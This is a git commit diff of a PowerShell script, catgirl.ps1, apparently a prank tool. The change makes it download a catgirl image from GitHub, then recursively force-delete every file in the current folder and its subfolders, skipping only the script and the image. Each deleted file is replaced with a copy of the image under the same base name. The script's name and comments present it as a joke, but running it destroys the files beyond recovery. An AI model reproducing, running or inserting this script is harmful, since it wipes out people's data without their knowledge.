360aadb31d2280240d9313c748385b09dbc1a157
Khalil Horton <horton.k223@gmail.com>
2025-04-02 16:51:01 -0400

    Finished

--- catgirl.ps1
+++ catgirl.ps1
@@ -1,9 +1,23 @@
-$targetFolder = "C:\Users\Khalil\Downloads\n\bull shit"
-$replacementImage = "C:\Users\Khalil\OneDrive\Pictures\download20240906012056.png"
+$targetFolder = gl
+$webImage = "https://github.com/Hortonk223/catgirl-supremacy/blob/main/catgirl.png?raw=true"
+$downloadedImage = "$targetFolder\catgirl.png"
+$scriptName = $MyInvocation.MyCommand.Name
+Write-Output $scriptName $downloadedImage
+# Download image
+Invoke-WebRequest -Uri $webImage -OutFile $downloadedImage -Verbose
 
 # Replace each file with the image while keeping the same name
-Get-ChildItem -Path $targetFolder -File -Recurse | ForEach-Object {
-    Write-Output "Replacing $_ with a catgirl"
-    $newFileName = "$($_.DirectoryName)\$($_.BaseName).png"
-    Copy-Item -Path $replacementImage -Destination $newFileName -Force
+Get-ChildItem -Path $targetFolder -File -Recurse | Where-Object { $_.Name -ne $scriptName -and $_.Name -ne "catgirl.png"} | ForEach-Object {
+    if (Test-Path $downloadedImage)
+    {
+        Write-Output "Replacing $_ with a catgirl"
+        Remove-Item -Path $_.FullName -Force  # Delete original file
+        $newFileName = "$($_.DirectoryName)\$($_.BaseName).png"
+        Copy-Item -Path $downloadedImage -Destination $newFileName -Force  # Replace with image
+    }
+    else 
+    {
+        Write-Output "Image didn't download correctly :("
+        break
+    }
 }
